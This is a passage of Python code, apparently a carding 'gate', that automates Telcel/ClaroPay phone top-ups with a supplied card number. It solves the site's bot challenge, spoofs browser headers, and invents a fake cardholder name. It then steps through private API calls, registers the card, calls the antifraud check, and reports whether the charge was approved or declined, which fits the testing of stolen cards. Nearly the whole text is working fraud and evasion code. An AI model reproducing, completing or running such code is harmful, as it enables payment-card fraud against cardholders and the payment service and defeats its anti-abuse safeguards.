        "folioProvisioning": spi.get("folioProvisioning"),
        "pendingAmount": pending_amt,
        "cuenta": num_cuenta,
    }


def gate_recarga(tarjeta: str, telefono: str, tipo: str, monto: int) -> dict:
    """Recarga con tarjeta: saldo, amigo_sin_limite, internet_amigo, internet_tiempo."""
    if tipo not in PRODUCTOS or monto not in PRODUCTOS[tipo]:
        return {
            "status": "error",
            "message": "tipo o monto no existe en el catálogo de Telcel",
            "disponibles": {k: sorted(v) for k, v in PRODUCTOS.items()},
        }
    try:
        c = clean_card(tarjeta)
    except ValueError as exc:
        return {"status": "error", "message": f"tarjeta inválida: {exc}"}
    service_id, product_id = PRODUCTOS[tipo][monto]
    num, msisdn = clean_phone(telefono)
    first, last = _genname()

    curl = _new_curl_session()
    cse = StormCasterCSE(verbose=False)
    cse.solve(curl, "https://pay.telcel.com/")
    referer = "https://pay.telcel.com/package/1?rsd=1"

    r1 = curl.post(
        "https://pay.telcel.com/api/erbium",
        headers=_chrome_headers(
            referer, {"content-type": "application/json", "uzlc": _uzlc(curl, cse), "priority": "u=1, i"}
        ),
        json={"msisdn": msisdn},
        timeout=30,
    )
    if r1.status_code != 200:
        return _gate_error(GateError("erbium", str(r1.status_code), body=r1.text))
    credential = r1.json()["credential"]

    r2 = curl.get(
        "https://pay.telcel.com/api/actinium",
        headers=_chrome_headers(
            referer,
            {
                "cp-bi": "com.claropay.web.portalpagos",
                "uzlc": _uzlc(curl, cse),
                "x-portal-credential": credential,
                "priority": "u=1, i",
            },
        ),
        params={"a": msisdn},
        timeout=30,
    )
    if r2.status_code != 200:
        return _gate_error(GateError("actinium", str(r2.status_code), body=r2.text))
    line = decrypt_data(r2.json()["data"])
    access_token = line["tokensDTO"]["access_token"]
    claro_id = _resolve_claro_id(line, access_token)
    if not claro_id or not access_token:
        return {"status": "error", "message": "la línea no devolvió sesión de ClaroPay"}

    r3 = curl.get(
        "https://pay.telcel.com/api/gallium",
        headers=_chrome_headers(
            referer,
            {
                "accept": "*/*",
                "authorization": f"Bearer {access_token}",
                "content-type": "application/json",
                "uzlc": _uzlc(curl, cse),
            },
        ),
        params={"token": access_token},
        timeout=30,
    )
    if r3.status_code not in (200, 201, 204):
        return _gate_error(GateError("gallium", str(r3.status_code), body=r3.text))

    try:
        client_id = _find_client_id(curl, cse, access_token, claro_id, referer)
        vesta_token = _vesta_tokenize(c["number"])
        t1_client = _t1_create_client(claro_id)
        client_id = client_id or t1_client
        card_token = _t1_add_card(c, client_id, first, last) or vesta_token
        _iridium_link_customer(curl, cse, access_token, claro_id, client_id, referer)
        _germanium_register_card(
            curl, cse, access_token, claro_id, c, card_token, first, last, referer
        )
        commission, darm_token = _fermium_fee(
            curl, cse, access_token, claro_id, referer, card_token
        )
        _hafnium_antifraud(curl, cse, access_token, referer)
        payload = _checkout_payload(
            c=c,
            claro_id=claro_id,
            client_id=client_id,
            first=first,
            last=last,
            destination=num,
            product_id=product_id,
            service_id=service_id,
            service_name="Telcel",
            amount=monto,
            commission=commission,
            darm_token=darm_token,
        )
        ok, message, subj, spi = _drmstatium_checkout(
            curl, cse, access_token, payload, referer
        )
    except GateError as exc:
        return _gate_error(exc)

    return {
        "status": "ok" if ok else "declined",
        "gateway": "Recarga Telcel/ClaroPay",
        "message": message,
        "responseSubject": subj,
        "serviceName": spi.get("serviceName"),
        "chargeDate": spi.get("chargeDate"),
        "chargeAmount": spi.get("chargeAmount"),
        "folioProvisioning": spi.get("folioProvisioning"),
        "phone": num,
        "tipo": tipo,
        "monto": monto,
    }
